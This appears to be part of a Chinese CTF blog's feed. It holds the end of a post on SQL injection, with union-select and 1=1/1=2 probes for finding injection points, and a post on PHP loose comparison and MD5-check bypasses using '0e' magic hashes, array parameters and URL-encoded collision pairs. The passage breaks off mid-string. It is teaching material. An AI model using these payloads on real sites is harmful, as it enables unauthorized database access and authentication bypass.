<span class="keyword">search</span> <span class="keyword">like</span> <span class="string">&#x27;%测试 %&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;%1%&#x27;</span><span class="operator">=</span><span class="string">&#x27;%1%&#x27;</span></span><br><span class="line"></span><br><span class="line">测试<span class="operator">%</span><span class="string">&#x27; union select 1,2,3,4 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a><strong>判断注入点</strong></h2><p><strong>注意区别语句报错与页面报错、页面数据不正确的区别</strong></p><p>​1.<code>?id=1 and 1=1</code> 和<code>?id=1 and 1=2</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。</p><p>​2.<code>?id=1&#39; and 1=1 --+ / #</code>和<code>?id=1&#39; and 1=2 --+ / #</code>或使用<code>?id&#39; and &#39;1&#39;=&#39;1</code>和<code>?id&#39; and &#39;1&#39;=&#39;2</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。</p><p>​3.<code>?id=1%&#39; and 1=1 --+ / #</code>和<code>?id=1%&#39; and 1=2 --+ / #</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。</p><h2 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SQL注入流程&quot;&gt;&lt;a href=&quot;#SQL注入流程&quot; class=&quot;headerlink&quot; title=&quot;SQL注入流程&quot;&gt;&lt;/a&gt;&lt;strong&gt;SQL注入流程&lt;/strong&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;找到注入点：判断是否有漏洞，寻找插入位置&lt;/li&gt;
&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-SQL" scheme="https://we11s.github.io/tags/Web-SQL/"/>
    
  </entry>
  
  <entry>
    <title>CTF-PHP验证</title>
    <link href="https://we11s.github.io/posts/2808981175/"/>
    <id>https://we11s.github.io/posts/2808981175/</id>
    <published>2023-10-18T14:34:42.000Z</published>
    <updated>2024-02-02T11:05:24.033Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><strong>PHP</strong></h1><h2 id="PHP中的比较符"><a href="#PHP中的比较符" class="headerlink" title="PHP中的比较符"></a>PHP中的比较符</h2><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。</strong></p><p>在php中有两种比较符号: 一种是 <strong>弱等于</strong>，另外一种是 <strong>强等于</strong>，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:</p><ol><li><p><strong>弱等于</strong></p><p>在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。</p><ol><li><p><code>==</code>：等于比较符号。用于比较两个值是否相等，不考虑数据类型。</p></li><li><p><code>!=</code> 或 <code>&lt;&gt;</code>：不等于比较符号。用于比较两个值是否不相等，不考虑数据类型。</p></li><li><p><code>&lt;</code>：小于比较符号。用于比较两个值的大小，如果左侧的值小于右侧的值，则条件为真。</p></li><li><p><code>&gt;</code>：大于比较符号。用于比较两个值的大小，如果左侧的值大于右侧的值，则条件为真。</p></li><li><p><code>&lt;=</code>：小于等于比较符号。用于比较两个值的大小，如果左侧的值小于或等于右侧的值，则条件为真。</p></li><li><p><code>&gt;=</code>：大于等于比较符号。用于比较两个值的大小，如果左侧的值大于或等于右侧的值，则条件为真。</p></li></ol></li><li><p><strong>强等于</strong></p><p>在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p><ol><li><code>===</code>：全等比较符号。用于比较两个值是否相等，并且数据类型也相同。</li><li><code>!==</code>：不全等比较符号。用于比较两个值是否不相等，或者数据类型不相同。</li></ol></li></ol><h3 id="弱等于转化规则规则"><a href="#弱等于转化规则规则" class="headerlink" title="弱等于转化规则规则"></a>弱等于转化规则规则</h3><p>1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。当字符串被当作一个数值来处理时，如果该字符串没有包含’<code>.</code>’,‘<code>e</code>’,’<code>E</code>’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且<strong>字符串开始部分决定它的取值，开始部分为数字（最开头的部分），则其值就是开始的数字，否则（包括后面出现数字的情况），其值为0</strong>。例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span>==<span class="string">&quot;12&quot;</span>                         <span class="comment">// true</span></span><br><span class="line"><span class="number">12</span>==<span class="string">&quot;12aa&quot;</span>                       <span class="comment">//true</span></span><br><span class="line"><span class="string">&quot;admin&quot;</span>==<span class="number">0</span>            <span class="comment">//true</span></span><br><span class="line"><span class="literal">false</span> == <span class="string">&quot;&quot;</span> == <span class="number">0</span> == <span class="literal">NULL</span><span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>2.布尔值true和任意字符串都弱相等。例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span>==<span class="string">&quot;hyuf&quot;</span>                     <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>3.数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；<br>    <em><code>0e</code>在比较的时候会将其视作为科学计数法，所以无论<code>0e</code>后面是什么，0的多少次方还是0；</em></p><h1 id="绕过MD5验证"><a href="#绕过MD5验证" class="headerlink" title="绕过MD5验证"></a><strong>绕过MD5验证</strong></h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><h3 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a><code>0e</code>绕过</h3><p><strong>原理</strong>：若使用PHP的弱比较时，<code>0e</code>开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) == <span class="title function_ invoke__">md5</span>(<span class="number">240610708</span>)</span><br></pre></td></tr></table></figure><p>MD5加密后得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0e830400451993494058024219903391</span> == <span class="number">0e462097431906509019562988736854</span>  <span class="comment">//即0==0，为true</span></span><br></pre></td></tr></table></figure><h3 id="常用MD5加密后为0e的字符串"><a href="#常用MD5加密后为0e的字符串" class="headerlink" title="常用MD5加密后为0e的字符串"></a>常用MD5加密后为<code>0e</code>的字符串</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">byGcY</span><br><span class="line">sonZ7y</span><br><span class="line">aabg7XSs</span><br><span class="line">aabC9RqS</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure><h2 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>原理：MD5无法加密数组，使用数组虽然会报错，返回了null，null&#x3D;&#x3D;null</p><p>使用方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=a&amp;b[]=b </span><br></pre></td></tr></table></figure><h3 id="强类型绕过（MD5碰撞）"><a href="#强类型绕过（MD5碰撞）" class="headerlink" title="强类型绕过（MD5碰撞）"></a>强类型绕过（MD5碰撞）</h3><p>原理：使用两个数值不同但MD5值相同的字符串（<strong>以下字符串经过URL编码</strong>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">--------------------</span><br><span class="line">c=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">   d=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">--------------------</span><br><span class="line">param1=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">    </span><br><span class="line">param2=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">------------------- Param1=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line">    </span><br><span class="line">Param2=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line">--------------------</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">--------------------</span><br><span class="line"><span class="variable">$s1</span> = %af%<span class="number">13</span>%<span class="number">76</span>%<span class="number">70</span>%<span class="number">82</span>%a0%a6%<span class="number">58</span>%cb%<span class="number">3</span>e%<span class="number">23</span>%<span class="number">38</span>%c4%c6%db%<span class="number">8</span>b%<span class="number">60</span>%<span class="number">2</span>c%bb%<span class="number">90</span>%<span class="number">68</span>%a0%<span class="number">2</span>d%e9%<span class="number">47</span>%aa%<span class="number">78</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">0</span>a%c0%c0%<span class="number">31</span>%d3%fb%cb%<span class="number">82</span>%<span class="number">25</span>%<span class="number">92</span>%<span class="number">0</span>d%cf%<span class="number">61</span>%<span class="number">67</span>%<span class="number">64</span>%e8%cd%<span class="number">7</span>d%<span class="number">47</span>%ba%<span class="number">0</span>e%<span class="number">5</span>d%<span class="number">1</span>b%<span class="number">9</span>c%<span class="number">1</span>c%<span class="number">5</span>c%cd%<span class="number">07</span>%<span class="number">2</span>d%f7%a8%<span class="number">2</span>d%<span class="number">1</span>d%bc%<span class="number">5</span>e%<span class="number">2</span>c%<span class="number">06</span>%<span class="number">46</span>%<span class="number">3</span>a%<span class="number">0</span>f%<span class="number">2</span>d%<span class="number">4</span>b%e9%<span class="number">20</span>%<span class="number">1</span>d%<span class="number">29</span>%<span class="number">66</span>%a4%e1%<span class="number">8</span>b%<span class="number">7</span>d%<span class="number">0</span>c%f5%ef%<span class="number">97</span>%b6%ee%<span class="number">48</span>%dd%<span class="number">0</span>e%<span class="number">09</span>%aa%e5%<span class="number">4</span>d%<span class="number">6</span>a%<span class="number">5</span>d%<span class="number">6</span>d%<span class="number">75</span>%<span class="number">77</span>%<span class="number">72</span>%cf%<span class="number">47</span>%<span class="number">16</span>%a2%<span class="number">06</span>%<span class="number">72</span>%<span class="number">71</span>%c9%a1%<span class="number">8</span>f%<span class="number">00</span>%f6%<span class="number">9</span>d%ee%<span class="number">54</span>%<span class="number">27</span>%<span class="number">71</span>%be%c8%c3%<span class="number">8</span>f%<span class="number">93</span>%e3%<span class="number">52</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">53</span>%a0%<span class="number">5</span>f%<span class="number">69</span>%ef%c3%<span class="number">3</span>b%ea%ee%<span class="number">70</span>%<span class="number">71</span>%ae%<span class="number">2</span>a%<span class="number">21</span>%c8%<span class="number">44</span>%d7%<span class="number">22</span>%<span class="number">87</span>%<span class="number">9</span>f%be%<span class="number">79</span>%<span class="number">6</span>d%c4%<span class="number">61</span>%a4%<span class="number">08</span>%<span class="number">57</span>%<span class="number">02</span>%<span class="number">82</span>%<span class="number">2</span>a%ef%<span class="number">36</span>%<span class="number">95</span>%da%ee%<span class="number">13</span>%bc%fb%<span class="number">7</span>e%a3%<span class="number">59</span>%<span class="number">45</span>%ef%<span class="number">25</span>%<span class="number">67</span>%<span class="number">3</span>c%e0%<span class="number">27</span>%<span class="number">69</span>%<span class="number">2</span>b%<span class="number">95</span>%<span class="number">77</span>%b8%cd%dc%<span class="number">4</span>f%de%<span class="number">73</span>%<span class="number">24</span>%e8%ab%<span class="number">66</span>%<span class="number">74</span>%d2%<span class="number">8</span>c%<span class="number">68</span>%<span class="number">06</span>%<span class="number">80</span>%<span class="number">0</span>c%dd%<span class="number">74</span>%ae%<span class="number">31</span>%<span class="number">05</span>%d1%<span class="number">15</span>%<span class="number">7</span>d%c4%<span class="number">5</span>e%bc%<span class="number">0</span>b%<span class="number">0</span>f%<span class="number">21</span>%<span class="number">23</span>%a4%<span class="number">96</span>%<span class="number">7</span>c%<span class="number">17</span>%<span class="number">12</span>%d1%<span class="number">2</span>b%b3%<span class="number">10</span>%b7%<span class="number">37</span>%<span class="number">60</span>%<span class="number">68</span>%d7%cb%<span class="number">35</span>%<span class="number">5</span>a%<span class="number">54</span>%<span class="number">97</span>%<span class="number">08</span>%<span class="number">0</span>d%<span class="number">54</span>%<span class="number">78</span>%<span class="number">49</span>%d0%<span class="number">93</span>%c3%b3%fd%<span class="number">1</span>f%<span class="number">0</span>b%<span class="number">35</span>%<span class="number">11</span>%<span class="number">9</span>d%<span class="number">96</span>%<span class="number">1</span>d%ba%<span class="number">64</span>%e0%<span class="number">86</span>%ad%ef%<span class="number">52</span>%<span class="number">98</span>%<span class="number">2</span>d%<span class="number">84</span>%<span class="number">12</span>%<span class="number">77</span>%bb%ab%e8%<span class="number">64</span>%da%a3%<span class="number">65</span>%<span class="number">55</span>%<span class="number">5</span>d%d5%<span class="number">76</span>%<span class="number">55</span>%<span class="number">57</span>%<span class="number">46</span>%<span class="number">6</span>c%<span class="number">89</span>%c9%df%b2%<span class="number">3</span>c%<span class="number">85</span>%<span class="number">97</span>%<span class="number">1</span>e%f6%<span class="number">38</span>%<span class="number">66</span>%c9%<span class="number">17</span>%<span class="number">22</span>%e7%ea%c9%f5%d2%e0%<span class="number">14</span>%d8%<span class="number">35</span>%<span class="number">4</span>f%<span class="number">0</span>a%<span class="number">5</span>c%<span class="number">34</span>%d3%<span class="number">73</span>%a5%<span class="number">98</span>%f7%<span class="number">66</span>%<span class="number">72</span>%aa%<span class="number">43</span>%e3%bd%a2%cd%<span class="number">62</span>%fd%<span class="number">69</span>%<span class="number">1</span>d%<span class="number">34</span>%<span class="number">30</span>%<span class="number">57</span>%<span class="number">52</span>%ab%<span class="number">41</span>%b1%<span class="number">91</span>%<span class="number">65</span>%f2%<span class="number">30</span>%<span class="number">7</span>f%cf%c6%a1%<span class="number">8</span>c%fb%dc%c4%<span class="number">8</span>f%<span class="number">61</span>%a5%<span class="number">93</span>%<span class="number">40</span>%<span class="number">1</span>a%<span class="number">13</span>%d1%<span class="number">09</span>%c5%e0%f7%<span class="number">87</span>%<span class="number">5</span>f%<span class="number">48</span>%e7%d7%b3%<span class="number">62</span>%<span class="number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="number">3</span>b%<span class="number">74</span>%<span class="number">28</span>%<span class="number">1</span>c%<span class="number">96</span>%<span class="number">8</span>e%<span class="number">09</span>%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">9</span>b%a6%<span class="number">2</span>f%ed%b7%<span class="number">99</span>%d5%b9%<span class="number">05</span>%<span class="number">39</span>%<span class="number">95</span>%ab</span><br><span class="line"><span class="variable">$s2</span> = %af%<span class="number">13</span>%<span class="number">76</span>%<span class="number">70</span>%<span class="number">82</span>%a0%a6%<span class="number">58</span>%cb%<span class="number">3</span>e%<span class="number">23</span>%<span class="number">38</span>%c4%c6%db%<span class="number">8</span>b%<span class="number">60</span>%<span class="number">2</span>c%bb%<span class="number">90</span>%<span class="number">68</span>%a0%<span class="number">2</span>d%e9%<span class="number">47</span>%aa%<span class="number">78</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">0</span>a%c0%c0%<span class="number">31</span>%d3%fb%cb%<span class="number">82</span>%<span class="number">25</span>%<span class="number">92</span>%<span class="number">0</span>d%cf%<span class="number">61</span>%<span class="number">67</span>%<span class="number">64</span>%e8%cd%<span class="number">7</span>d%<span class="number">47</span>%ba%<span class="number">0</span>e%<span class="number">5</span>d%<span class="number">1</span>b%<span class="number">9</span>c%<span class="number">1</span>c%<span class="number">5</span>c%cd%<span class="number">07</span>%<span class="number">2</span>d%f7%a8%<span class="number">2</span>d%<span class="number">1</span>d%bc%<span class="number">5</span>e%<span class="number">2</span>c%<span class="number">06</span>%<span class="number">46</span>%<span class="number">3</span>a%<span class="number">0</span>f%<span class="number">2</span>d%<span class="number">4</span>b%e9%<span class="number">20</span>%<span class="number">1</span>d%<span class="number">29</span>%<span class="number">66</span>%a4%e1%<span class="number">8</span>b%<span class="number">7</span>d%<span class="number">0</span>c%f5%ef%<span class="number">97</span>%b6%ee%<span class="number">48</span>%dd%<span class="number">0</span>e%<span class="number">09</span>%aa%e5%<span class="number">4</span>d%<span class="number">6</span>a%<span class="number">5</span>d%<span class="number">6</span>d%<span class="number">75</span>%<span class="number">77</span>%<span class="number">72</span>%cf%<span class="number">47</span>%<span class="number">16</span>%a2%<span class="number">06</span>%<span class="number">72</span>%<span class="number">71</span>%c9%a1%<span class="number">8</span>f%<span class="number">00</span>%f6%<span class="number">9</span>d%ee%<span class="number">54</span>%<span class="number">27</span>%<span class="number">71</span>%be%c8%c3%<span class="number">8</span>f%<span class="number">93</span>%e3%<span class="number">52</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">53</span>%a0%<span class="number">5</span>f%<span class="number">69</span>%ef%c3%<span class="number">3</span>b%ea%ee%<span class="number">70</span>%<span class="number">71</span>%ae%<span class="number">2</span>a%<span class="number">21</span>%c8%<span class="number">44</span>%d7%<span class="number">22</span>%<span class="number">87</span>%<span class="number">9</span>f%be%<span class="number">79</span>%<span class="number">6</span>d%c4%<span class="number">61</span>%a4%<span class="number">08</span>%<span class="number">57</span>%<span class="number">02</span>%<span class="number">82</span>%<span class="number">2</span>a%ef%<span class="number">36</span>%<span class="number">95</span>%da%ee%<span class="number">13</span>%bc%fb%<span class="number">7</span>e%a3%<span class="number">59</span>%<span class="number">45</span>%ef%<span class="number">25</span>%<span class="number">67</span>%<span class="number">3</span>c%e0%<span class="number">27</span>%<span class="number">69</span>%<span class="number">2</span>b%<span class="number">95</span>%<span class="number">77</span>%b8%cd%dc%<span class="number">4</span>f%de%<span class="number">73</span>%<span class="number">24</span>%e8%ab%<span class="number">66</span>%<span class="number">74</span>%d2%<span class="number">8</span>c%<span class="number">68</span>%<span class="number">06</span>%<span class="number">80</span>%<span class="number">0</span>c%dd%<span class="number">74</span>%ae%<span class="number">31</span>%<span class="number">05</span>%d1%<span class="number">15</span>%<span class="number">7</span>d%c4%<span class="number">5</span>e%bc%<span class="number">0</span>b%<span class="number">0</span>f%<span class="number">21</span>%<span class="number">23</span>%a4%<span class="number">96</span>%<span class="number">7</span>c%<span class="number">17</span>%<span class="number">12</span>%d1%<span class="number">2</span>b%b3%<span class="number">10</span>%b7%<span class="number">37</span>%<span class="number">60</span>%<span class="number">68</span>%d7%cb%<span class="number">35</span>%<span class="number">5</span>a%<span class="number">54</span>%<span class="number">97</span>%<span class="number">08</span>%<span class="number">0</span>d%<span class="number">54</span>%<span class="number">78</span>%<span class="number">49</span>%d0%<span class="number">93</span>%c3%b3%fd%<span class="number">1</span>f%<span class="number">0</span>b%<span class="number">35</span>%<span class="number">11</span>%<span class="number">9</span>d%<span class="number">96</span>%<span class="number">1</span>d%ba%<span class="number">64</span>%e0%<span class="number">86</span>%ad%ef%<span class="number">52</span>%<span class="number">98</span>%<span class="number">2</span>d%<span class="number">84</span>%<span class="number">12</span>%<span class="number">77</span>%bb%ab%e8%<span class="number">64</span>%da%a3%<span class="number">65</span>%<span class="number">55</span>%<span class="number">5</span>d%d5%<span class="number">76</span>%<span class="number">55</span>%<span class="number">57</span>%<span class="number">46</span>%<span class="number">6</span>c%<span class="number">89</span>%c9%<span class="number">5</span>f%b2%<span class="number">3</span>c%<span class="number">85</span>%<span class="number">97</span>%<span class="number">1</span>e%f6%<span class="number">38</span>%<span class="number">66</span>%c9%<span class="number">17</span>%<span class="number">22</span>%e7%ea%c9%f5%d2%e0%<span class="number">14</span>%d8%<span class="number">35</span>%<span class="number">4</span>f%<span class="number">0</span>a%<span class="number">5</span>c%<span class="number">34</span>%d3%f3%a5%<span class="number">98</span>%f7%<span class="number">66</span>%<span class="number">72</span>%aa%<span class="number">43</span>%e3%bd%a2%cd%<span class="number">62</span>%fd%e9%<span class="number">1</span>d%<span class="number">34</span>%<span class="number">30</span>%<span class="number">57</span>%<span class="number">52</span>%ab%<span class="number">41</span>%b1%<span class="number">91</span>%<span class="number">65</span>%f2%<span class="number">30</span>%<span class="number">7</span>f%cf%c6%a1%<span class="number">8</span>c%fb%dc%c4%<span class="number">8</span>f%<span class="number">61</span>%a5%<span class="number">13</span>%<span class="number">40</span>%<span class="number">1</span>a%<span class="number">13</span>%d1%<span class="number">09</span>%c5%e0%f7%<span class="number">87</span>%<span class="number">5</span>f%<span class="number">48</span>%e7%d7%b3%<span class="number">62</span>%<span class="number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="number">3</span>b%<span class="number">74</span>%a8%<span class="number">1</span>b%<span class="number">96</span>%<span class="number">8</span>e%<span class="number">09</span>%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">9</span>b%a6%<span class="number">2</span>f%ed%b7%<span class="number">99</span>%d5%<span class="number">39</span>%<span class="number">05</span>%<span class="number">39</span>%<span class="number">95</span>%ab</span><br><span class="line"><span class="variable">$s3</span> = %af%<span class="number">13</span>%<span class="number">76</span>%<span class="number">70</span>%<span class="number">82</span>%a0%a6%<span class="number">58</span>%cb%<span class="number">3</span>e%<span class="number">23</span>%<span class="number">38</span>%c4%c6%db%<span class="number">8</span>b%<span class="number">60</span>%<span class="number">2</span>c%bb%<span class="number">90</span>%<span class="number">68</span>%a0%<span class="number">2</span>d%e9%<span class="number">47</span>%aa%<span class="number">78</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">0</span>a%c0%c0%<span class="number">31</span>%d3%fb%cb%<span class="number">82</span>%<span class="number">25</span>%<span class="number">92</span>%<span class="number">0</span>d%cf%<span class="number">61</span>%<span class="number">67</span>%<span class="number">64</span>%e8%cd%<span class="number">7</span>d%<span class="number">47</span>%ba%<span class="number">0</span>e%<span class="number">5</span>d%<span class="number">1</span>b%<span class="number">9</span>c%<span class="number">1</span>c%<span class="number">5</span>c%cd%<span class="number">07</span>%<span class="number">2</span>d%f7%a8%<span class="number">2</span>d%<span class="number">1</span>d%bc%<span class="number">5</span>e%<span class="number">2</span>c%<span class="number">06</span>%<span class="number">46</span>%<span class="number">3</span>a%<span class="number">0</span>f%<span class="number">2</span>d%<span class="number">4</span>b%e9%<span class="number">20</span>%<span class="number">1</span>d%<span class="number">29</span>%<span class="number">66</span>%a4%e1%<span class="number">8</span>b%<span class="number">7</span>d%<span class="number">0</span>c%f5%ef%<span class="number">97</span>%b6%ee%<span class="number">48</span>%dd%<span class="number">0</span>e%<span class="number">09</span>%aa%e5%<span class="number">4</span>d%<span class="number">6</span>a%<span class="number">5</span>d%<span class="number">6</span>d%<span class="number">75</span>%<span class="number">77</span>%<span class="number">72</span>%cf%<span class="number">47</span>%<span class="number">16</span>%a2%<span class="number">06</span>%<span class="number">72</span>%<span class="number">71</span>%c9%a1%<span class="number">8</span>f%<span class="number">00</span>%f6%<span class="number">9</span>d%ee%<span class="number">54</span>%<span class="number">27</span>%<span class="number">71</span>%be%c8%c3%<span class="number">8</span>f%<span class="number">93</span>%e3%<span class="number">52</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">53</span>%a0%<span class="number">5</span>f%<span class="number">69</span>%ef%c3%<span class="number">3</span>b%ea%ee%<span class="number">70</span>%<span class="number">71</span>%ae%<span class="number">2</span>a%<span class="number">21</span>%c8%<span class="number">44</span>%d7%<span class="number">22</span>%<span class="number">87</span>%<span class="number">9</span>f%be%<span class="number">79</span>%ed%c4%<span class="number">61</span>%a4%<span class="number">08</span>%<span class="number">57</span>%<span class="number">02</span>%<span class="number">82</span>%<span class="number">2</span>a%ef%<span class="number">36</span>%<span class="number">95</span>%da%ee%<span class="number">13</span>%bc%fb%<span class="number">7</span>e%a3%<span class="number">59</span>%<span class="number">45</span>%ef%<span class="number">25</span>%<span class="number">67</span>%<span class="number">3</span>c%e0%a7%<span class="number">69</span>%<span class="number">2</span>b%<span class="number">95</span>%<span class="number">77</span>%b8%cd%dc%<span class="number">4</span>f%de%<span class="number">73</span>%<span 